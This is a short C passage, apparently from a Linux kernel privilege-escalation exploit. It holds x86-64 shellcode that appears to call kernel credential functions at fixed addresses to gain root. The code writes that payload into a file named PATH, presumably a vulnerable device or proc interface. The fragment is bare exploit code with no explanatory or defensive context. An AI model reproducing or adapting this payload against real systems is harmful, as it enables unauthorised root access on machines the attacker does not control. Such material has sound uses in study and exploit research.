    char shellcode[] = "H1\xffH\xc7\xc0`\x96\x08\x81\xff\xd0H\x89\xc7H\xc7\xc0\x10\x93\x08\x81\xff\xd0\xc3";

    fd = open(PATH, O_WRONLY);
    write(fd, shellcode, strlen(shellcode));
